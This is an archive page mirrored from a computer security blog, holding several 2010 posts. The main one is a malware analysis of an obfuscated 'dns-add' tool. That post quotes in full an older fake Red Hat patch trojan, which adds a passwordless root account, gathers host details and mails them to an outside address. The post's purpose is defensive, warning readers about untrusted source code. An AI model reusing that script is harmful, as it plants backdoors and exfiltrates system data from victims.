<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" lang="en-US">
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" lang="en-US">
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html lang="en-US">
<!--<![endif]-->
<link rel="stylesheet" href="../../../css/fontello.css">
<link rel="stylesheet" href="../../../css/animation.css">

<!-- Mirrored from phocean.net/category/security/page/10 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:59:42 GMT -->
<!-- Mirrored from phocean.net/category/security/page/10 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 26 May 2019 07:59:42 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width" />
<title>Security | Phocean.net | Page 10</title>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<link rel="pingback" href="../../../xmlrpc.php" />
<!--[if lt IE 9]>
<script src="/wp-content/themes/twentytwelve/js/html5.js"></script>
<![endif]-->

	  <link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
<link rel='dns-prefetch' href='http://s.w.org/' />
<link href='https://fonts.gstatic.com/' crossorigin rel='preconnect' />
<link rel="alternate" type="application/rss+xml" title="Phocean.net &raquo; Feed" href="/feed" />
<link rel="alternate" type="application/rss+xml" title="Phocean.net &raquo; Security Category Feed" href="../feed" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/phocean.net\/wp-includes\/js\/wp-emoji-release.min.js"}};
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/phocean.net\/wp-includes\/js\/wp-emoji-release.min.js"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-lightbox-2.min.css-css'  href='/wp-content/plugins/wp-lightbox-2/styles/lightbox.min.css?ver=1.3.4' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-fonts-css'  href='https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,400,700&amp;subset=latin,latin-ext' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-style-css'  href='/wp-content/themes/twentytwelve-child/style.css?ver=4.9.10' type='text/css' media='all' />
<link rel='stylesheet' id='twentytwelve-block-style-css'  href='/wp-content/themes/twentytwelve/css/blocks.css?ver=20181230' type='text/css' media='all' />
<!--[if lt IE 9]>
<link rel='stylesheet' id='twentytwelve-ie-css'  href='/wp-content/themes/twentytwelve/css/ie.css?ver=20121010' type='text/css' media='all' />
<![endif]-->
<script type='text/javascript' src='/wp-includes/js/jquery/jquery.js'></script>
<script type='text/javascript' src='/wp-includes/js/jquery/jquery-migrate.min.js'></script>
<link rel='https://api.w.org/' href='../../../wp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../../xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 4.9.10" />
	<style type="text/css" id="twentytwelve-header-css">
			.site-header h1 a,
		.site-header h2 {
			color: #627690;
		}
		</style>
	</head>

<body class="archive paged category category-security category-17 paged-10 category-paged-10 full-width custom-font-enabled single-author">
<div id="page" class="hfeed site">
	<header id="masthead" class="site-header" role="banner">
		<hgroup>
                        <div style="float:left">

			<a href="../../../index.html" >
			<img class="logo" src="../../../logo.svg" width="119" height="77" onerror="this.removeAttribute('onerror'); this.src='../../../logo.html'" />
			</a>

                        <!--<img src="/wp-content/themes/twentytwelve-child/logo.png" style="vertical-align:middle;"/>-->

                        </div>
                        <div style="float:left">
                        <h1 class="site-title">
                      <span><a href="../../../index.html" title="Phocean.net" rel="home">
                        Phocean.net</a></span></h1>
			<h2 class="site-description">Computer Security Blog</h2>
                </div>
		<div style="float:right;overflow:hidden;word-wrap: break-word;">
			<form role="search" method="get" id="searchform" class="searchform" action="/">
				<div>
					<label class="screen-reader-text" for="s">Search for:</label>
					<input type="text" value="" name="s" id="s" />
					<input type="submit" id="searchsubmit" value="Search" />
				</div>
			</form>		</div>
		</hgroup>

                <div style="clear:both"></div>
		<nav id="site-navigation" class="main-navigation" role="navigation">
			<h3 class="menu-toggle">Menu</h3>
			<a class="assistive-text" href="#content" title="Skip to content">Skip to content</a>
			<div class="menu-top-container"><ul id="menu-top" class="nav-menu"><li id="menu-item-1527" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1527"><a href="../../../index.html"><i class="icon-home"></i> Blog</a></li>
<li id="menu-item-1919" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1919"><a href="../../../archives.html"><i class="icon-archive"></i> Archives</a></li>
<li id="menu-item-1525" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1525"><a href="../../../tools.html"><i class="icon-beaker"></i> Code</a></li>
<li id="menu-item-1559" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1559"><a href="../../../docs.html"><i class="icon-doc"></i> Docs</a></li>
<li id="menu-item-1526" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1526"><a href="../../../about.html"><i class="icon-user"></i> About</a></li>
<li id="menu-item-1809" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1809"><a href="http://twitter.com/_phocean"><i class="icon-twitter-1"></i> Twitter</a></li>
<li id="menu-item-1810" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1810"><a href="../../../indexcc4d.html?feed=rss"><i class="icon-rss"></i> RSS</a></li>
</ul></div>		</nav><!-- #site-navigation -->

			</header><!-- #masthead -->

	<div id="main" class="wrapper">
	<section id="primary" class="site-content">
		<div id="content" role="main">

					<header class="archive-header">
				<h1 class="archive-title">Category Archives: <span>Security</span></h1>

						</header><!-- .archive-header -->

			
	<article id="post-911" class="post-911 post type-post status-publish format-standard hentry category-defense category-reversing category-windows tag-alsr tag-buffer-overflow tag-dep tag-emet tag-sehop tag-windows">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2010/09/25/emet-configure-memory-protection-on-windows.html" title="Permalink to EMET: configure memory protection on Windows" rel="bookmark">EMET: configure memory protection on Windows</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>Microsoft published a nice tool named <a title="EMET" href="http://www.microsoft.com/downloads/en/confirmation.aspx?FamilyID=c6f0a6ee-05ac-4eb6-acd0-362559fd2f04" target="_blank">EMET</a> (Enhanced Mitigation Experience Toolkit) whose purpose is to check and enforce the memory security policies such as ALSR and DEP.</p>
<p>It shows and allows to configure the global settings, but also, and this is the most interesting part, indicated for each process running if it supports those security measures. It is even able to enforce the protections for each application which would not support it natively (i.e. not set at compilation time).</p>
<p style="text-align: center;"><img class="aligncenter" title="EMET" src="../../../wp-content/uploads/2010/09/EMET.png" alt="" width="640" height="360" /></p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../defense.html" rel="category tag">Defense</a>, <a href="../reversing.html" rel="category tag">Reversing</a>, <a href="../../administration-systeme/windows.html" rel="category tag">Windows</a> <i class="icon-tag"></i> <a href="../../../tag/alsr.html" rel="tag">ALSR</a>, <a href="../../../tag/buffer-overflow.html" rel="tag">buffer overflow</a>, <a href="../../../tag/dep.html" rel="tag">DEP</a>, <a href="../../../tag/emet.html" rel="tag">EMET</a>, <a href="../../../tag/sehop.html" rel="tag">SEHOP</a>, <a href="../../../tag/windows.html" rel="tag">Windows</a> <i class="icon-calendar"></i> <a href="../../../2010/09/25/emet-configure-memory-protection-on-windows.html" title="5:56 pm" rel="bookmark"><time class="entry-date" datetime="2010-09-25T17:56:00+00:00">September 25, 2010</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-877" class="post-877 post type-post status-publish format-standard hentry category-defense category-news category-security tag-authentication tag-openid tag-password tag-security tag-wordpress">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2010/07/23/openid-rants.html" title="Permalink to OpenID rants" rel="bookmark">OpenID rants</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>After I tried to set this blog as my own OpenID provider using the <a title="OpenID WordPress Plugin" href="http://wordpress.org/extend/plugins/openid/" target="_blank">OpenID WordPress plugin</a>, I got a weired error message:</p>
<p><em>&#8220;This is an OpenID Server, Nothing to See Here&#8230; Move  Along&#8221;</em></p>
<p>I could not find what as wrong, as all prerequisites were fulfilled, until I find this <a title="openID server" href="http://patchlog.com/wordpress/openid-server-on-php-5-3/" target="_blank">nice post</a>. The patch there works very well, thanks to the author (it is a shame that it wasn&#8217;t yet included in the trunk).</p>
<p>This and the lack of active open-source development around OpenID seems to show that it is not really popular. It is a shame because it is a pretty good solution against the multiplication of passwords. I wouldn&#8217;t want to use OpenID for my bank account access, but it is just right for many sites, forums, etc. Unfortunately, no many sites are yet OpenID enabled and the choice when you want to become your own provider is very limited (most of projects listed in the official wiki are dead, with no update for the last 2 years).</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../defense.html" rel="category tag">Defense</a>, <a href="../../news.html" rel="category tag">News</a>, <a href="../../security.html" rel="category tag">Security</a> <i class="icon-tag"></i> <a href="../../../tag/authentication.html" rel="tag">Authentication</a>, <a href="../../../tag/openid.html" rel="tag">OpenID</a>, <a href="../../../tag/password.html" rel="tag">password</a>, <a href="../../../tag/security.html" rel="tag">Security</a>, <a href="../../../tag/wordpress.html" rel="tag">Wordpress</a> <i class="icon-calendar"></i> <a href="../../../2010/07/23/openid-rants.html" title="5:44 am" rel="bookmark"><time class="entry-date" datetime="2010-07-23T05:44:37+00:00">July 23, 2010</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-862" class="post-862 post type-post status-publish format-standard hentry category-defense category-pentesting category-privacy-security category-security tag-book tag-hacking tag-review tag-security">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2010/05/16/books-review.html" title="Permalink to Books review" rel="bookmark">Books review</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>I just finished reading two electronic books I bought from O&#8217;reilly. Here is a short review on them.</p>
<h4>Hacking: the next generation</h4>
<p><a title="Hacking: the next generation" href="http://oreilly.com/catalog/9780596154585/" target="_blank"><img class="aligncenter size-full wp-image-863" title="hacking_next_gen" src="../../../wp-content/uploads/2010/05/hacking_next_gen.gif" alt="" width="180" height="236" /></a></p>
<p>The purpose of this book is to give to the readers an overview of the most common attacks nowadays. It covers all fields : social engineering, web attacks, networking, etc.<br />
It was easy to read : the authors are straight to the point and their sentences are clear.</p>
<p>I especially appreciated their state of art about XSS and CSRF attacks. It is certainly the best I have read so far, greatly illustrated with exciting and real case studies.</p>
<p>On the other hand,  I quickly passed over the networking stuff (both wired and wireless). It was too basic and didn&#8217;t show anything new &#8211; maybe it is because I specialize in those fields.</p>
<p>Anyway, globally, I strongly recommend this book. It is worth while your money if you want to know more on web attacks or to have a good overview of modern threats.</p>
<h4>Beautiful Security</h4>
<p><a title="Beautiful Security" href="http://oreilly.com/catalog/9780596527488/" target="_blank"><img class="aligncenter size-full wp-image-864" title="beautiful_sec" src="../../../wp-content/uploads/2010/05/beautiful_sec.gif" alt="" width="180" height="236" /></a></p>
<p>This is a collection of essays by some of the best security experts and hackers.</p>
<p>Well, I won&#8217;t go around, I have been quite disappointed by this book. The overall lacks coherence and after a while you start wondering what this book is trying to demonstrate. At the end, there is a crual lack of connection between the essays and it globally makes it appear very confusing.</p>
<p>It also sometimes lacks technical references and the writing style is too verbose, too literal for a technical book to be attractive.</p>
<p>There are however some good essays, like one about PGP (by Philip Zimmermann himself, though). It is hard to find some good and complete documentation about it, and this essay is definitely a good one, which I will probably read again when I feel the need of it.</p>
<p>But I wouldn&#8217;t recommend this book only for this short piece of writing. Lack of cohesion, too much litterature and not enough technical stuff actually bored me, though that&#8217;s just my personal taste.</p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../defense.html" rel="category tag">Defense</a>, <a href="../pentesting.html" rel="category tag">Pentesting</a>, <a href="../privacy-security.html" rel="category tag">Privacy</a>, <a href="../../security.html" rel="category tag">Security</a> <i class="icon-tag"></i> <a href="../../../tag/book.html" rel="tag">Book</a>, <a href="../../../tag/hacking.html" rel="tag">Hacking</a>, <a href="../../../tag/review.html" rel="tag">Review</a>, <a href="../../../tag/security.html" rel="tag">Security</a> <i class="icon-calendar"></i> <a href="../../../2010/05/16/books-review.html" title="6:16 pm" rel="bookmark"><time class="entry-date" datetime="2010-05-16T18:16:46+00:00">May 16, 2010</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-793" class="post-793 post type-post status-publish format-standard hentry category-cryptography category-forensic category-linux category-reversing category-security category-administration-systeme tag-bash tag-c tag-cryptography tag-malware tag-obfuscation tag-rc4 tag-shell tag-shellcode tag-social-engineering">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2010/04/24/beware-of-source-code-even-from-your-favorite-portalforum.html" title="Permalink to Beware of source code (even from your favorite portal/forum/&#8230;)" rel="bookmark">Beware of source code (even from your favorite portal/forum/&#8230;)</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>The other day I stumbed upon a weired piece of software on <a title="Howtoforge.com" href="http://howtoforge.com/" target="_blank">howtoforge.com</a> : <a title="dns-add" href="http://www.howtoforge.com/adding-dns-servers-in-one-step-with-dns-add" target="_blank">dns-add</a> (code <a title="Sourceforge dns-add" href="http://sourceforge.net/projects/isp-fw/files/DNS-add/" target="_blank">on sourceforge.net</a>).</p>
<p>Actually, the purpose of dns-add was very intriguing : update your DNS in one command !</p>
<p>The output should look like this:</p>
<pre>...::: ISP-fW DNS add v1.0  :::... http://isp-fw.sourceforge.net/
--== copyleft 2005-2006 ==-- | Free memory:         864
contact isp.devel@gmail.com
You can add up to 9 DNS servers, enter a number from [0-9]: 2
Enter DNS1: 192.168.157.193
Enter DNS2: 192.168.157.251
Done adding 2 DNS!
DNS 192.168.157.193 responded in 0.256 ms
DNS 192.168.157.251 responded in 0.112 ms</pre>
<p>Who would need it these days where all distros include tools and script to update the DNS with DHCP. At worst, it is just a matter of opening an editor to add two lines in <code>/etc/resolv.conf</code>. Done in 10 seconds.</p>
<p>To enjoy dns-add, we are supposed to compile the source code. Let&#8217;s have a look at it first.</p>
<p>It gets quickly obvious that there could be something nasty. The code is clearly obfuscated, to make it difficult to read:</p>
<ul>
<li>not much commented,</li>
<li>a bunch of strange variables like &#8220;\026\243\314\376\220\366\154\166\346\334\005\116\360\114\015\231&#8221;. Could be the real code, hidden,</li>
<li>None of the visible stuff seems to do anything on the DNS.</li>
</ul>
<p>So now, let&#8217;s try to find out what&#8217;s behind all that. As we have the source code, the idea is to understand what the code is doing, so that we can write a snippet at the right place to just read the deciphered and potentially malicious code. That&#8217;s the easiest way, no need to disassembly and do memory forensic.</p>
<p>A good practice is to look for some pieces of code on the web, as developpers are lazy and often reuse already existing code. Doing that, you can save a lot of time.</p>
<p>Bingo ! There is a code almost entirely identical <a title="RedHat update malware" href="http://packetstormsecurity.nl/0410-advisories/FakeRedhatPatchAnalysis.txt" target="_blank">there</a>.<br />
We learn that the code, as old as 6 years old, actually hid a shell trojan instead of beeing a Red Hat update as claimed.</p>
<p>There is clearly a risk, so we must check what the code of dns-add contains. Here more hints help us again about the encoding used : some comments and a function name mention RC4 (or ARC4).</p>
<p>So let&#8217;s see how RC4 works and compare it with its possible implementation in dns-add.<br />
Rougly, RC4 is just an improved XOR whith the help of a lot of keys permutations. I found a clear and short description <a title="RC4" href="http://www.frontiernet.net/~fys/cypher.htm" target="_blank">there</a> :</p>
<blockquote><p>RC4 has two phases: key setup and ciphering.</p>
<p>The key setup phase is only done once per message and starts by initializing the entire state array so that the first state element is zero, the second is one, the third is two, and so on.</p>
<p>The state array is then subjected to 256 mixing operations using a loop that steps i through the values from zero to 255.</p>
<p>Each mixing operation consists of two steps:<br />
Add to the variable j the contents of the ith element of the state array and the nth element of the key, where n is equal to i modulo the length of the key.  (remember, the key here means the 10 byte IV at the front of the file, (or the one your program creates, if encoding), and the given key on the command line. (Key+IV)<br />
Swap the ith and jth elements of the state array.</p>
<p>After the entire mixing loop is completed, i and j are set to zero.</p>
<p>During the ciphering operation, the following steps are performed for each byte of the message:</p>
<p>The variable i is incremented by one<br />
The contents of the ith element of &#8216;State&#8217; is then added to j<br />
The ith and jth elements of &#8216;State&#8217; are swapped and their contents are added together to form a new value n.<br />
The nth element of &#8216;State&#8217; is then combined with the message byte, using a bit by bit exclusive-or operation (XOR), to form the output byte.<br />
The same ciphering steps are performed for encryption and for decryption.</p></blockquote>
<p><strong><em>void key(void * str, int len)</em></strong> for setting the key setup phase and <strong><em>void arc4(void * str, int len, char *hint)</em></strong> for the deciphering phase do exactly what&#8217;s described above.</p>
<p>They are called by <em><strong>char * xsh(int argc, char ** argv)</strong></em>, which we are going to look at carefully now.</p>
<p>This function succevely setup all keys and decipher all the hardcoded vars. Note that a function, <strong><em>chkenv,</em></strong> setup a variable in the environment, based on the PID (and other tricks). It is not useful in the present case, but it could be developped further and used for example to avoid over-infections.</p>
<p>What&#8217;s interesting is actually the bottom of the function, where the guy actually builds the shellcode, putting alltogether the pieces of deciphered code.</p>
<pre>j = 0;
varg[j++] = argv[0];		/* My own name at execution */
if (ret && *opts)
	varg[j++] = opts;	/* Options on 1st line of code */
if (*inlo)
	varg[j++] = inlo;	/* Option introducing inline code */
varg[j++] = scrpt;		/* The script itself */
if (*lsto)
	varg[j++] = lsto;	/* Option meaning last option */
i = (ret > 1) ? ret : 0;	/* Args numbering correction */
while (i < argc)
	varg[j++] = argv[i++];	/* Main run-time arguments */
varg[j] = 0;			/* NULL terminated array */</pre>
<p>Then, it is launched with execvp:</p>
<pre>
#if DEBUGEXEC
debugexec(shll, j, varg);
#endif
execvp(shll, varg);
return shll;
</pre>
<p><strong>Before testing further, it is safer to comment out the execvp line.</strong></p>
<p>Now, we just need to retrieve the shellcode, so we just add this lazy piece of code (to insert right before #if DEBUGEXEC):</p>
<pre>
FILE *fout;
char **tmp;
tmp = varg;
fout = fopen ("dns-test","w");
do {
  fprintf (fout, *tmp);
}
while (*tmp++ != NULL);
fclose (fout);</pre>
<p>Here we go :</p>
<pre>
$ ./dns-add
$ cat shellcode
./dns-add-c           <blank chars skipped>                    #!/bin/bash

dnsfile="/etc/resolv.conf"
failed='\e[1;31m'failed'\e[0m'
ok='\e[1;34m'ok'\e[0m'

function dns_add(){
mv -f $dnsfile $dnsfile.back
for (( i=1; i <= $dns_nr; i++ )) do
    echo -n "Enter DNS${i}: "
    read dns;
    echo "nameserver $dns" >> $dnsfile;
done
echo "Done adding $dns_nr DNS!"
echo
for i in `cat $dnsfile | cut -d " " -f 2`; do
    if [ `ping -c 1 $i | grep -c "100%"` -eq 1 ]; then
            echo -e "DNS $i $failed to respond => request timeout :( "
    else
        echo -ne "DNS $i responded in ";
        ping -c 1 $i | grep icmp_seq | cut -d "=" -f 4;
    fi
done
}

clear
echo -e "...::: ISP-fW DNS add v1.0  :::...""\e[1m\e[36;40m" "http://isp-fw.sourceforge.net/\e[0m ";
echo -e "--== copyleft 2005-2006 ==-- | Free memory: $(free -m|grep cache:|cut -d ":" -f2|cut -c12-22)";
echo "contact isp.devel@gmail.com"
echo
echo -n "You can add up to 9 DNS servers, enter a number from [0-9]: ";
read dns_nr;

case $dns_nr in
  [0-9]         ) dns_add;;
  [[:lower:]]   ) echo "$dns_nr is not a number!";;
  [[:upper:]]   ) echo "$dns_nr is not a number!";;
  *             ) echo "$dns_nr is not a number!";;
esac
./dns-add</pre>
<p>That's it. A big C file just for this lame shell script. The good news is that it does what it says. There is no malicious purpose, for now, it's nothing else than a (bad) joke.</p>
<p>In the case of the original malware, it was more harmfull :</p>
<pre>#!/bin/sh
cd /tmp/
clear
if [ `id -u` != "0" ]
then
        echo "This patch must be applied as \"root\", and you are: \"`whoami`\""
        exit
fi
echo "Identifying the system. This may take up to 2 minutes. Please wait ..."
sleep 3
if [ ! -d /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." " ]; then
 echo "Inca un root frate belea: " >> /tmp/mama
 adduser -g 0 -u 0 -o bash >> /tmp/mama
 passwd -d bash >> /tmp/mama
 ifconfig >> /tmp/mama
 uname -a >> /tmp/mama
 uptime >> /tmp/mama
 sshd >> /tmp/mama
 echo "user bash stii tu" >> /tmp/mama
 cat /tmp/mama | mail -s "Inca o roata" root@addlebrain.com >> /dev/null
 rm -rf /tmp/mama
 mkdir -p /tmp/." "/." "/." "/." "/." "/." "/." "/." "/." "
fi

bla()
{
  sleep 2
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 2
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 3
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 4
  echo -n "#"
  sleep 1
  echo -n "#"
  sleep 1
  echo "#"
  sleep 1
}

echo "System looks OK. Proceeding to next step."
sleep 1
echo
echo -n "Patching \"ls\": "
bla
echo -n "Patching \"mkdir\": "
bla
echo
echo "System updated and secured successfuly. You may erase these files."
sleep 1
./badexec 'exec '%s' "$@"' "$@"</pre>
<p>Technically, at the end, it is rather basic. However, it is successful in the way that it hides its purpose to most people.<br />
What's not clear yet is the poster purpose. Fun ? Any other weired feeling ? Or just testing the capacity of the community to detect maliscious software ? If so, was he just curious or does he have any future plan ?<br />
Maybe I should ask him.</p>
<p>Anyway, how many people opened and read the code ? Especially on a community driven website where people tend to have a dangerous feeling of trust and safety : it can't be malicious, the author offers the source code and nicely shares his work, right ?<br />
And among the few people who checked the code, who really understood it ? Not everyone is an IT specialist. And even among them, not everyone is a developper or can read C.</p>
<p>It highlights well several things :</p>
<ul>
<li><strong>social engineering is multi-platform ! </strong>We are often more vulnerable than our systems. Linux user or not.</li>
<li><strong>software published with the source code doesn't mean safe software</strong>.</li>
</ul>
<p>As much as possible, download software exclusively from the official repositories of your favorite distribution (openSUSE ;)).<br />
If you really have to use code from an untrusted source, check it, or wait for the right people to do it! Don't just grab any code, compile it and execute it blindly.</p>
<p>At the same time as open-source software grows, we, users, and also websites like Sourceforge will have to be more carefull about the content we download.</p>
<p><strong><span style="color: #ff0000;"><em><span style="color: #ff0000;">* Update *</span></em></span></strong></p>
<p><em><span style="color: #993300;">I did contact the author and didn't get any answer.<br />
I reported the issue to Sourceforge, which deleted the account hosting dns-add, as it violated the website policies.</span></em></p>
<p><em><span style="color: #993300;">You can download the source code </span></em><a href="../../../wp-content/uploads/2010/04/dns-add.tar.gz"><em><span style="color: #0000ff;">dns-add.tar.gz</span></em></a><em><span style="color: #993300;"> if you want to analyse it.</span></em></p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
			<i class="icon-folder-open-empty"></i> <a href="../cryptography.html" rel="category tag">Cryptography</a>, <a href="../forensic.html" rel="category tag">Forensic</a>, <a href="../../administration-systeme/linux.html" rel="category tag">Linux</a>, <a href="../reversing.html" rel="category tag">Reversing</a>, <a href="../../security.html" rel="category tag">Security</a>, <a href="../../administration-systeme.html" rel="category tag">System</a> <i class="icon-tag"></i> <a href="../../../tag/bash.html" rel="tag">Bash</a>, <a href="../../../tag/c.html" rel="tag">C</a>, <a href="../../../tag/cryptography.html" rel="tag">Cryptography</a>, <a href="../../../tag/malware.html" rel="tag">malware</a>, <a href="../../../tag/obfuscation.html" rel="tag">obfuscation</a>, <a href="../../../tag/rc4.html" rel="tag">RC4</a>, <a href="../../../tag/shell.html" rel="tag">shell</a>, <a href="../../../tag/shellcode.html" rel="tag">shellcode</a>, <a href="../../../tag/social-engineering.html" rel="tag">social engineering</a> <i class="icon-calendar"></i> <a href="../../../2010/04/24/beware-of-source-code-even-from-your-favorite-portalforum.html" title="2:14 pm" rel="bookmark"><time class="entry-date" datetime="2010-04-24T14:14:04+00:00">April 24, 2010</time></a><span class="by-author"> by <span class="author vcard"><a class="url fn n" href="../../../author/jc.html" title="View all posts by phocean" rel="author">phocean</a></span></span>.								</footer><!-- .entry-meta -->
	</article><!-- #post -->
	<article id="post-773" class="post-773 post type-post status-publish format-standard hentry category-cryptography category-linux category-security category-administration-systeme tag-apache tag-certificate tag-chrome tag-cve-2009-3555 tag-firefox tag-mod-ssl">
				<header class="entry-header">

						<h1 class="entry-title">
				<a href="../../../2010/04/05/updates-about-openssl-cve-2009-3555-client-renegociation.html" title="Permalink to Updates on OpenSSL CVE-2009-3555 (client renegociation)" rel="bookmark">Updates on OpenSSL CVE-2009-3555 (client renegociation)</a>
			</h1>
								</header><!-- .entry-header -->

				<div class="entry-content">
			<!-- Adds 140x140 featured image to single post view -->
			<div class="excerpt-thumb">
							</div>
			<p>So there are some news from the front of OpenSSL CVE-2009-3555 (see <a title="SSL client authenticate breakage" href="../../../2009/11/28/openssl-cve-2009-3555-security-fix-and-mod_ssl-client-authentication-breakage.html" target="_self">this</a> and <a title="SSL/TLS RFC updated against CVE-2009-3555" href="../../../2010/01/09/ssltls-rfc-updated-against-cve-2009-3555.html" target="_self">this</a> for the history).</p>
<p>Now the latest version of Apache mod_ssl (2.2) embeds an <a title="mod_ssl client renegociation" href="http://httpd.apache.org/docs/2.2/mod/mod_ssl.html#sslinsecurerenegotiation" target="_blank">option to reactivate old way client renegociation</a> :</p>
<pre>SSLInsecureRenegotiation on</pre>
<p>Check the official doc for more details. With this option activated, you can now safely upgrade openSSL and mod_ssl without breaking your clients. They should have done it from the begining, shouldn&#8217;t they ?</p>
<p>The next step will be to move on to the new protocol definitely, to solve for good the CVE-2009-3555 vulnerability. For that we have to wait for the browsers to support it.</p>
<p>Firefox has started to <a title="Firefox and CVE-2009-3555" href="https://wiki.mozilla.org/Security:Renegotiation" target="_blank">work seriously on it</a> and we can expect some support in the next releases (some settings will be possible through about:config).</p>
<p>They even created a <a title="CVE-2009-3555 test page" href="https://ssltls.de/" target="_blank">test site</a>. This screenshot was taken from Google Chrome (5.0.366.2, <a title="openSUSE repos" href="http://en.opensuse.org/Additional_package_repositories" target="_blank">openSUSE repo</a>) which already has support for the SSL protocol :</p>
<p style="text-align: center;"><a href="../../../wp-content/uploads/2010/04/chrome-ssl.png" rel="lightbox[773]"><img class="aligncenter size-full wp-image-776" title="chrome-ssl" src="../../../wp-content/uploads/2010/04/chrome-ssl.png" alt="" width="455" height="473" /></a></p>
					</div><!-- .entry-content -->
		
		<footer class="entry-meta">
